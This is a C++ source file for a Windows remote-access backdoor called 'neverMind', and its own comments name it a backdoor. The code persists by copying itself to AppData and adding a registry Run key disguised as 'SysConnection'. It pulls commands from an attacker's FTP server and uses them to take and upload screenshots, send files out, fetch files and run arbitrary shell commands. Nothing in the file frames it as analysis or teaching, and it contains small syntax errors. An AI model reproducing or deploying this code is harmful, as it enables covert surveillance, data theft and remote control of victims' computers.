#include "neverMind.h"

// constructor that inits backdoor with provided ftp host, username, pw
neverMind::neverMind(const std::string &host, const std::string &username, const std::string &password)
    : ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper::get_username()), store_path("C:\\Users\\" + win_username + "\\AppData\\Local\\SystemConnect"), data_path((std::filesystem::path(store_path) / "data").u8string()), app_path((std::filesystem::path(store_path) / "app").u8string()), output_path((std::filesystem::path(data_path) / "output.txt").u8string())
{
// init ftp connection + set up paths for the backdoor
}

// destructor that cleans up the backdoor
neverMind::~neverMind()
{
// can be empty if there are no specific resources that need to be cleaned up
}

// open the backdoor
// set up necessary dirs, connect to ftp, download/execute commands, manage registry
void neverMind::start()
{
    // check if backdoor has been opened before
    if (!std::filesystem::exists(store_path))
        setup(); // if not, set up necessary directories

    // connect to ftp
    ftp_connection.connect();

    // switch to user dir (create if necessary)
    if (!ftp_connection.cd(win_username)) {
        ftp_connection.mkdir(win_username);
        ftp_connection.cd(win_username);
    }

    // download script from ftp and compile it
    std::string file_path = (std::filesystem::path(app_path) / "cmd.txt").u8string();
    if (ftp_connection.retr_file(file_path, "cmd.txt")) {
        Sleep(1500); // wait for file to be downloaded
        compile(file_path);
    }

    // upload output file to ftp server
    ftp_connection.upload_file(output_path, "output.txt");
    Sleep(2000);
}

// definition of setup
void neverMind::setup()
{
    std::filesystem::create_directory(store_path);
    std::filesystem::create_directory(data_path);
    std::filesystem::create_directory(app_path);
    add_to_reg(); // add backdoor to registry (defined below)
}

// definition of add_to_reg
void neverMind::add_to_reg()
{
    std::string cmd = "";
    WCHAR path[MAX_PATH];
    int len = GetModuleFileNameW(NULL, path, MAX_PATH);
    std::string new_path;
    std::string dest = (std::filesystem::path(store_path) / "explore.exe").u8string();

    for (int i - 0; i < len; ++i)
        new_path += path[i];
    
    std::filesystem::copy_file(new_path, dest);
    system(std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \"" + dest + "\"").c_str());
}

// compile + execute commands from file
void neverMind::compile(const std::string &file_path)
{
    str::string code = wrapper::read_file(file_path);
    std::stringstream ss_code(code);
    std::string line;

    while (std::getline(ss_code, line))
    {
        try {
            std::vector<std::string> spl_line;
            std::stringstream ss_line(line);
            std::string command;

            while (std::getline(ss_line, command, ' ')) {
                spl_line.push_back(command);
            }
            execute(spl_line);
        }
        catch (...) {
            continue;
        }
    }
}

// execution of provided commands
void neverMind::execute(const std::vector<std::string>& spl_line)
{
    try {
        std::string main_cmd = spl_line[0];
        // print: take string as arg + append to output file
        if (main_cmd == "print") {
            if (spl_line.size() < 2) {
                wrapper::append_file(output_path, "[!] error [!]\n\n");
                return;
            }
            wrapper::append_file(output_path, "[>] " + spl_line[1] + " [<]\n\n");
        }
        // screen: take int as arg (how many screenshots to take); it then uploads them to the "screens" dir on the ftp server and appends a message to output_path file for each screenshot taken
        else if (main_cmd == "screen") {
            if (spl_line.size() < 2) {
                wrapper::append_file(output_path, "[!] error [!]\n\n");
                return;
            }
            int counter = std::stoi(spl_line[1]);

            if (!ftp_connection.cd("screens")) {
                ftp_connection.mkdir("screens");
                ftp_connection.cd("screens");
            }
            for (int i = 0; i < counter, ++i)
            {
                std::string screenshot_path = wrapper::screenshot(data_path);
                Sleep(500);
                ftp_connection.upload_file(screenshot_path, std::filesystem::path(screenshot_path).filename().u8string());
                Sleep(1000);
                wrapper::append_file(output_path, "[++] screenshots saved >> " + screenshot_path + " [++]\n\n");
            }
            ftp_connection.cd("../");
        }
        // upload: uploads file from local filepath (first arg) + uploads to specified ftp filepath (second arg)
        else if (main_cmd == "upload") {
            if (spl_line.size() < 3) {
                wrapper::append_file(output_path, "[!] error [!]\n\n");
                return;
            }
            if (!ftp_connection.cd("uploads")) {
                wrapper::append_file(output_path, "[!] folder not found [!]\n\n");
                return;
            }
            if (ftp_connection.retr_file(spl_line[2], spl_line[1]))
                wrapper::append_file(output_path, "[++] file upload successful [++]\n\n");
            else
                wrapper::append_file(output_path, "[!!] upload error [!!]\n\n");
            ftp_connection.cd("../");
        }
        // download: the inverse of upload
        else if (main_cmd == "download") {

			if (spl_line.size() < 2) {
				wrapper::append_file(output_path, "[!] error [!]\n\n");
				return;
			}

			if (!ftp_connection.cd("downloads")) {
				ftp_connection.mkdir("downloads");
				ftp_connection.cd("downloads");
			}

			if (ftp_connection.upload_file(spl_line[1], std::filesystem::path(spl_line[1]).filename().u8string()))
				wrapper::append_file(output_path, "[++] file download successful [++]\n\n");
			else
				wrapper::append_file(output_path, "[!!] downloading error [!!]\n\n");

			ftp_connection.cd("../");
		}
        // exec: takes command line arg and executes using WinExec
        else if (main_cmd == "exec")
        {
            if (spl_line.size() < 2) {
                wrapper::append_file(output_path, "[!] error [!]\n\n");
                return;
            }
            WinExec(std::string("cmd \"d:" + spl_line[1] + "f\"").c_str(), 0);
        }
        else {
            wrapper::append_file(output_path, "[!!] command: " + main_cmd + "not found [!!]\n\n");
        }
    }
    catch (...)
    {
        wrapper::append_file(output_path, "[!!] error [!!]\n\n");
    }
}